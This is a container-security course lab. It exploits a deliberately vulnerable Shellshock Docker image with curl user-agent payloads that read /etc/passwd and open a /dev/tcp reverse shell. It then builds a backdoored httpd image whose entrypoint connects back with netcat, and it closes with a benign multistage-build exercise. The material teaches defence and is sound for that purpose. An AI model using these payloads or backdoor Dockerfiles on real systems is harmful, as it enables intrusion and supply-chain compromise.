Objective: Understand how vulnerable images can be dangerous when they are used in Docker/Kubernetes environment. 
#### Exploiting vulnerable images
* These vulnerabilities can potentially provide an attacker foothold on your containers and the hosts
where Docker is being run. 
* Create a directory and navigate into that. 
```bash
mkdir ~/shellshock; cd ~/shellshock
```
* To demonstrate this let's pull a vulnerable image from Docker Hub and
see how it can be exploited.
* Using docker run, you are going to use the image which is tagged as ​vulnerables/cve-2014-6271 which is
basically a CVE identifier for shellshock vulnerability.
```bash
docker run -itd --name shellshock-container  -p 8080:80 vulnerables/cve-2014-6271
```
* List the running containers
```bash
docker ps
CONTAINER ID   IMAGE                       COMMAND              CREATED          STATUS          PORTS                                   NAMES
04c89bd62301   vulnerables/cve-2014-6271   "/main.sh default"   20 seconds ago   Up 19 seconds   0.0.0.0:8080->80/tcp, :::8080->80/tcp   shellshock-container
```
* Check the webserver inside the container is running 
```bash
curl http://localhost:8080

<html>
    <head><title>Vulnerables | ShellShock</title></head>
    <body>
        <h1>This image is vulnerable to ShellShock, please exploit it</h1>
        <pre>The script is at /cgi-bin/vulnerable</pre>
    </body>
</html>
```
* From the output, you can see that the application is up and running so we can now try to
exploit it.
* Use the following payload that is already given by the author of this docker image. This payload is
going to display the contents of the ​/etc/passwd file when run against a web server vulnerable to
shellshock. Let us execute the following payload in a new terminal window.
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://localhost:8080/cgi-bin/vulnerable

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
```
* Login into the container
```bash
docker exec -it 04c bash

root@04c89bd62301:/# 
```
* In the container's bash terminal run the modified the payload to get a reverse shell instead of reading the file contents. Let's
run the following command and try to get a reverse shell.
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'" http://localhost:8080/cgi-bin/vulnerable
```
--------------
#### Backdooring existing Docker images
* Attackers can create malicious images, or they can infect existing legitimate images and
re-upload them into a place like Docker Hub.
* Create a directory 'backdoor' and navigate into that
```bash
mkdir ~/backdoor; cd ~/backdoor
```
* Create a Dockerfile to modify the existing image. This Dockerfile will install the backdoor.
```bash
FROM httpd:latest
RUN apt-get update && apt-get install screen netcat-traditional -y
ENTRYPOINT screen -d -m /bin/nc.traditional 172.17.0.1 4444 -e /bin/bash && httpd-foreground
```
* Create a backdoor image using the dockerfile.
```bash
docker build -t backdoor .
```
* In terminal 2 Start the nc command 
```bash
nc -v -k -l 172.17.0.1 4444

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on 172.17.0.1:4444
```
* In terminal 1 start a container using the backdoor image
```bash
docker run -itd --name bcontainer1 -p 8080:80 backdoor

8007aaf47336c4118e2e0b837a7854ccfdf8f899ef5bb966296e77044d4dc29a
```
* List the running containers
```bash
docker ps

CONTAINER ID   IMAGE      COMMAND                  CREATED         STATUS         PORTS                                   NAMES
8007aaf47336   backdoor   "/bin/sh -c 'screen …"   3 seconds ago   Up 2 seconds   0.0.0.0:8080->80/tcp, :::8080->80/tcp   bcontainer
```
* Move to terminal 2 and verify the Backdoor Connection. When the Docker container runs, it should connect back to your attacker machine, giving you a shell on the container.
```bash
nc -v -k -l 172.17.0.1 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on 172.17.0.1:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:58278.

cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```
* Once you have completed your testing or educational exercise, make sure to remove the backdoored image and any containers created to prevent any unintentional misuse.

#### Best practices for building containers 
#### Build the smallest image possible
* Clone the following repo
```bash
git clone https://github.com/blrk/multistage-build-flask.git
```
* Nagivate into the cloned repo
```bash
cd multistage-build-flask/
```
* Verify the contents of Dockerfile, app.py, requirements.txt, and index.html
* Build container image uisng the pre configured Dockerfile
```bash
docker build -t pyapp:1.0 .
```
* Start a container
```bash
docker run -itd -p 5000:5000 pyapp:1.0
```
* Access the app
```bash
curl http://localhost:5000

<!DOCTYPE html>
<html>
<head>
    <title>Flask App</title>
</head>
<body>
    <h1>Hello from Flask! Welcome to Container security Course</h1>
</body>
</html>
```